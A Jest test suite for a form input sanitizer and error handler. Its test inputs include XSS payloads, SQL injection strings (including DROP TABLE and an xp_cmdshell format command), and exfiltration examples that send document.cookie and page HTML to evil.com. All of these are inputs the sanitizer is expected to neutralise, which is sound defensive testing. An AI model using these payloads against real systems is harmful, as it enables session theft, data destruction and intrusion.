import { FormErrorHandler, UserNotification, InputSanitizer } from '../errorHandler';

// Mock console methods to avoid noise in tests
const originalConsole = console;
beforeAll(() => {
  console.log = jest.fn();
  console.warn = jest.fn();
  console.error = jest.fn();
});

afterAll(() => {
  console.log = originalConsole.log;
  console.warn = originalConsole.warn;
  console.error = originalConsole.error;
});

describe('InputSanitizer', () => {
  describe('validateInput', () => {
    it('handles null and undefined values', () => {
      expect(InputSanitizer.validateInput(null)).toEqual({
        isValid: true,
        sanitized: ''
      });
      
      expect(InputSanitizer.validateInput(undefined)).toEqual({
        isValid: true,
        sanitized: ''
      });
    });

    it('handles string values', () => {
      const result = InputSanitizer.validateInput('hello world');
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe('hello world');
    });

    it('converts non-string values to strings', () => {
      expect(InputSanitizer.validateInput(123)).toEqual({
        isValid: true,
        sanitized: '123'
      });
      
      expect(InputSanitizer.validateInput(true)).toEqual({
        isValid: true,
        sanitized: 'true'
      });
    });

    it('handles objects that can be converted to strings', () => {
      const result = InputSanitizer.validateInput({ toString: () => 'custom string' });
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe('custom string');
    });
  });

  describe('sanitizeString - XSS Prevention', () => {
    it('removes script tags', () => {
      const malicious = '<script>alert("xss")</script>Hello World';
      const sanitized = InputSanitizer.sanitizeString(malicious);
      expect(sanitized).toBe('Hello World');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('removes all HTML tags', () => {
      const htmlContent = '<div><p>Hello <strong>World</strong></p></div>';
      const sanitized = InputSanitizer.sanitizeString(htmlContent);
      expect(sanitized).toBe('Hello World');
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
    });

    it('removes dangerous protocols', () => {
      const maliciousInputs = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'vbscript:msgbox("xss")',
        'javascript : alert("xss")', // with spaces
        'JAVASCRIPT:alert("xss")', // case insensitive
      ];

      maliciousInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeString(input);
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('data:');
        expect(sanitized).not.toContain('vbscript:');
        expect(sanitized).not.toContain('alert');
      });
    });

    it('removes event handlers', () => {
      const maliciousInputs = [
        'onclick="alert(1)"',
        'onmouseover="alert(1)"',
        'onerror="alert(1)"',
        'onload="alert(1)"',
        ' onclick ="alert(1)"', // with spaces
        'ONCLICK="alert(1)"', // case insensitive
      ];

      maliciousInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeString(input);
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('onmouseover');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('alert');
      });
    });

    it('removes HTML entities that could be used for XSS', () => {
      const entityInputs = [
        '&lt;script&gt;alert("xss")&lt;/script&gt;',
        '&quot;onclick=&quot;alert(1)&quot;',
        '&#x27;onclick=&#x27;alert(1)&#x27;',
        '&#x2F;script&#x2F;',
        '&#x5C;script&#x5C;',
        '&#96;script&#96;',
      ];

      entityInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeString(input);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('alert');
      });
    });

    it('removes zero-width and invisible characters', () => {
      const invisibleChars = 'Hello\u200B\u200C\u200D\uFEFFWorld';
      const sanitized = InputSanitizer.sanitizeString(invisibleChars);
      expect(sanitized).toBe('HelloWorld');
    });

    it('preserves safe content', () => {
      const safeInputs = [
        'Hello World',
        'Price: $100.99',
        'Email: user@example.com',
        'Phone: +1-555-123-4567',
        'Date: 2023-12-25',
        'Special chars: !@#$%^&*()_+-=[]{}|;:,.<>?',
        'Unicode: 测试 🚀 émojis',
      ];

      safeInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeString(input);
        expect(sanitized).toBe(input);
      });
    });

    it('handles edge cases', () => {
      expect(InputSanitizer.sanitizeString('')).toBe('');
      expect(InputSanitizer.sanitizeString('   ')).toBe('');
      expect(InputSanitizer.sanitizeString('\n\t\r')).toBe('');
    });
  });

  describe('sanitizeHTML - Selective HTML Sanitization', () => {
    it('removes dangerous HTML tags', () => {
      const dangerousContent = `
        <script>alert("xss")</script>
        <iframe src="javascript:alert('xss')"></iframe>
        <object data="malicious.swf"></object>
        <embed src="malicious.swf">
        <form><input type="hidden" name="csrf" value="token"></form>
        <p>Safe content</p>
      `;
      
      const sanitized = InputSanitizer.sanitizeHTML(dangerousContent);
      expect(sanitized).toContain('<p>Safe content</p>');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('<object');
      expect(sanitized).not.toContain('<embed');
      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('<input');
    });

    it('removes dangerous protocols in HTML attributes', () => {
      const maliciousHtml = `
        <a href="javascript:alert('xss')">Click me</a>
        <img src="data:text/html,<script>alert('xss')</script>">
        <link href="vbscript:msgbox('xss')">
      `;
      
      const sanitized = InputSanitizer.sanitizeHTML(maliciousHtml);
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('data:text/html');
      expect(sanitized).not.toContain('vbscript:');
    });

    it('removes event handlers from HTML', () => {
      const maliciousHtml = `
        <div onclick="alert('xss')">Click me</div>
        <img src="image.jpg" onerror="alert('xss')">
        <body onload="alert('xss')">
        <p onmouseover="alert('xss')">Hover me</p>
      `;
      
      const sanitized = InputSanitizer.sanitizeHTML(maliciousHtml);
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('alert');
    });

    it('preserves safe HTML content', () => {
      const safeHtml = `
        <h1>Title</h1>
        <p>This is a <strong>paragraph</strong> with <em>emphasis</em>.</p>
        <ul>
          <li>Item 1</li>
          <li>Item 2</li>
        </ul>
        <a href="https://example.com">Safe link</a>
        <img src="image.jpg" alt="Safe image">
      `;
      
      const sanitized = InputSanitizer.sanitizeHTML(safeHtml);
      expect(sanitized).toContain('<h1>Title</h1>');
      expect(sanitized).toContain('<strong>paragraph</strong>');
      expect(sanitized).toContain('<em>emphasis</em>');
      expect(sanitized).toContain('<ul>');
      expect(sanitized).toContain('<li>');
      expect(sanitized).toContain('<a href="https://example.com">');
      expect(sanitized).toContain('<img src="image.jpg"');
    });
  });

  describe('validateFormData - Comprehensive Form Validation', () => {
    it('validates simple form data', () => {
      const formData = {
        name: 'John Doe',
        email: 'john@example.com',
        age: 30,
        active: true,
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitized).toEqual(formData);
    });

    it('sanitizes dangerous content in form data', () => {
      const formData = {
        name: '<script>alert("xss")</script>John Doe',
        description: '<p>Safe content</p><script>alert("xss")</script>',
        title: 'javascript:alert("xss")',
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized.name).toBe('John Doe');
      expect(result.sanitized.description).toBe('<p>Safe content</p>');
      expect(result.sanitized.title).not.toContain('javascript:');
    });

    it('handles nested objects', () => {
      const formData = {
        user: {
          name: '<script>alert("xss")</script>John',
          profile: {
            bio: '<p>Safe bio</p><script>alert("xss")</script>',
          },
        },
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized.user.name).toBe('John');
      expect(result.sanitized.user.profile.bio).toBe('<p>Safe bio</p>');
    });

    it('handles arrays with mixed content', () => {
      const formData = {
        tags: ['safe tag', '<script>alert("xss")</script>malicious'],
        items: [
          { name: 'Item 1', description: '<p>Safe</p>' },
          { name: '<script>alert("xss")</script>Item 2', description: 'Safe text' },
        ],
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized.tags[0]).toBe('safe tag');
      expect(result.sanitized.tags[1]).toBe('malicious');
      expect(result.sanitized.items[0].description).toBe('<p>Safe</p>');
      expect(result.sanitized.items[1].name).toBe('Item 2');
    });

    it('preserves File objects', () => {
      const file = new File(['content'], 'test.txt', { type: 'text/plain' });
      const formData = {
        name: 'Test Form',
        file: file,
        files: [file],
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized.file).toEqual(file);
      expect(result.sanitized.files[0]).toEqual(file);
      expect(result.sanitized.file.name).toBe('test.txt');
      expect(result.sanitized.files[0].name).toBe('test.txt');
    });

    it('handles null and undefined values', () => {
      const formData = {
        name: 'John',
        email: null,
        phone: undefined,
        age: 0,
        active: false,
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized.name).toBe('John');
      expect(result.sanitized.email).toBe(null);
      expect(result.sanitized.phone).toBe(null);
      expect(result.sanitized.age).toBe(0);
      expect(result.sanitized.active).toBe(false);
    });

    it('handles invalid data types gracefully', () => {
      const invalidData = [
        null,
        undefined,
        'not an object',
        123,
        true,
      ];

      invalidData.forEach(data => {
        const result = InputSanitizer.validateFormData(data);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      });
    });

    it('detects HTML vs plain text fields correctly', () => {
      const formData = {
        title: '<script>alert("xss")</script>Title', // Plain text field
        content: '<p>Safe content</p><script>alert("xss")</script>', // HTML field
        description: '<p>Safe desc</p><script>alert("xss")</script>', // HTML field
        headline: '<h1>Safe headline</h1><script>alert("xss")</script>', // HTML field
        sectionContent: '<div>Safe section</div><script>alert("xss")</script>', // HTML field
        name: '<b>Bold name</b>', // Plain text field
      };

      const result = InputSanitizer.validateFormData(formData);
      expect(result.isValid).toBe(true);
      
      // Plain text fields should have all HTML removed
      expect(result.sanitized.title).toBe('Title');
      expect(result.sanitized.name).toBe('Bold name');
      
      // HTML fields should preserve safe HTML but remove dangerous content
      expect(result.sanitized.content).toBe('<p>Safe content</p>');
      expect(result.sanitized.description).toBe('<p>Safe desc</p>');
      expect(result.sanitized.headline).toBe('<h1>Safe headline</h1>');
      expect(result.sanitized.sectionContent).toBe('<div>Safe section</div>');
    });

    it('handles circular references safely', () => {
      const circularData: any = { name: 'Test' };
      circularData.self = circularData;

      const result = InputSanitizer.validateFormData(circularData);
      // Should handle the error gracefully
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });
  });

  describe('validateAndSanitizeField - Individual Field Processing', () => {
    it('handles string fields correctly', () => {
      const result = InputSanitizer.validateAndSanitizeField('name', '<script>alert("xss")</script>John');
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe('John');
    });

    it('handles HTML fields correctly', () => {
      const result = InputSanitizer.validateAndSanitizeField('content', '<p>Safe</p><script>alert("xss")</script>');
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe('<p>Safe</p>');
    });

    it('handles array fields', () => {
      const arrayData = ['safe', '<script>alert("xss")</script>dangerous'];
      const result = InputSanitizer.validateAndSanitizeField('tags', arrayData);
      expect(result.isValid).toBe(true);
      expect(result.sanitized[0]).toBe('safe');
      expect(result.sanitized[1]).toBe('dangerous');
    });

    it('handles File objects', () => {
      const file = new File(['content'], 'test.txt', { type: 'text/plain' });
      const result = InputSanitizer.validateAndSanitizeField('file', file);
      expect(result.isValid).toBe(true);
      expect(result.sanitized).toBe(file);
    });

    it('handles primitive values', () => {
      expect(InputSanitizer.validateAndSanitizeField('age', 25).sanitized).toBe(25);
      expect(InputSanitizer.validateAndSanitizeField('active', true).sanitized).toBe(true);
      expect(InputSanitizer.validateAndSanitizeField('count', null).sanitized).toBe(null);
    });
  });

  describe('Error Handling', () => {
    it('handles processing errors gracefully', () => {
      const problematicData = {
        get dangerous() {
          throw new Error('Processing error');
        }
      };

      const result = InputSanitizer.validateFormData(problematicData);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('provides meaningful error messages', () => {
      const result = InputSanitizer.validateFormData(null);
      expect(result.errors[0]).toContain('Form data is required');
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('prevents complex XSS attacks', () => {
      const complexXSS = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus="alert(1)" autofocus>',
        '<select onfocus="alert(1)" autofocus><option>test</option></select>',
        '<textarea onfocus="alert(1)" autofocus>test</textarea>',
        '<details open ontoggle="alert(1)">',
        '<marquee onstart="alert(1)">test</marquee>',
      ];

      complexXSS.forEach(attack => {
        const sanitized = InputSanitizer.sanitizeString(attack);
        expect(sanitized).not.toContain('alert');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('onfocus');
        expect(sanitized).not.toContain('ontoggle');
        expect(sanitized).not.toContain('onstart');
      });
    });

    it('prevents SQL injection patterns', () => {
      const sqlInjection = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1' UNION SELECT * FROM users --",
        "'; EXEC xp_cmdshell('format c:'); --",
      ];

      sqlInjection.forEach(attack => {
        const sanitized = InputSanitizer.sanitizeString(attack);
        // Should preserve the content but without dangerous execution
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    it('prevents data exfiltration attempts', () => {
      const exfiltrationAttempts = [
        '<img src="http://evil.com/steal.php?data=" + document.cookie>',
        '<script>fetch("http://evil.com/steal", {method: "POST", body: document.body.innerHTML})</script>',
        '<iframe src="http://evil.com/phishing.html">',
      ];

      exfiltrationAttempts.forEach(attack => {
        const sanitized = InputSanitizer.sanitizeString(attack);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('<iframe>');
        expect(sanitized).not.toContain('fetch');
        expect(sanitized).not.toContain('document.cookie');
      });
    });
  });

  describe('Performance Tests', () => {
    it('handles large inputs efficiently', () => {
      const largeInput = 'a'.repeat(10000) + '<script>alert("xss")</script>';
      const start = performance.now();
      const sanitized = InputSanitizer.sanitizeString(largeInput);
      const end = performance.now();
      
      expect(sanitized).not.toContain('<script>');
      expect(end - start).toBeLessThan(100); // Should complete within 100ms
    });

    it('handles complex nested objects efficiently', () => {
      const complexData = {
        level1: {
          level2: {
            level3: {
              level4: {
                level5: Array.from({ length: 100 }, (_, i) => ({
                  id: i,
                  name: `Item ${i}`,
                  description: '<p>Safe content</p><script>alert("xss")</script>',
                }))
              }
            }
          }
        }
      };

      const start = performance.now();
      const result = InputSanitizer.validateFormData(complexData);
      const end = performance.now();

      expect(result.isValid).toBe(true);
      expect(end - start).toBeLessThan(1000); // Should complete within 1 second
    });
  });
});

describe('FormErrorHandler', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('handleError', () => {
    it('handles Error objects', () => {
      const error = new Error('Test error');
      const result = FormErrorHandler.handleError(error);
      expect(result).toBe('Test error');
    });

    it('handles string errors', () => {
      const result = FormErrorHandler.handleError('String error');
      expect(result).toBe('String error');
    });

    it('handles unknown error types', () => {
      const result = FormErrorHandler.handleError({ unknown: 'error' });
      expect(result).toBe('An unexpected error occurred');
    });

    it('handles null/undefined errors', () => {
      expect(FormErrorHandler.handleError(null)).toBe('An unexpected error occurred');
      expect(FormErrorHandler.handleError(undefined)).toBe('An unexpected error occurred');
    });
  });

  describe('handleValidationError', () => {
    it('creates validation error objects', () => {
      const error = FormErrorHandler.handleValidationError('email', 'Invalid email format');
      expect(error.field).toBe('email');
      expect(error.message).toBe('Invalid email format');
      expect(error.type).toBe('validation');
    });
  });

  describe('logError', () => {
    it('logs errors with context', () => {
      const error = new Error('Test error');
      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      
      FormErrorHandler.logError(error, 'TestContext');
      
      expect(consoleSpy).toHaveBeenCalledWith('[TestContext] Error:', error);
      consoleSpy.mockRestore();
    });
  });
});

describe('UserNotification', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('showSuccess', () => {
    it('displays success messages', () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      
      UserNotification.showSuccess('Operation successful');
      
      expect(consoleSpy).toHaveBeenCalledWith('[SUCCESS]', 'Operation successful');
      consoleSpy.mockRestore();
    });
  });

  describe('showError', () => {
    it('displays error messages', () => {
      const consoleSpy = jest.spyOn(console, 'error').mockImplementation();
      
      UserNotification.showError('Operation failed');
      
      expect(consoleSpy).toHaveBeenCalledWith('[ERROR]', 'Operation failed');
      consoleSpy.mockRestore();
    });
  });
});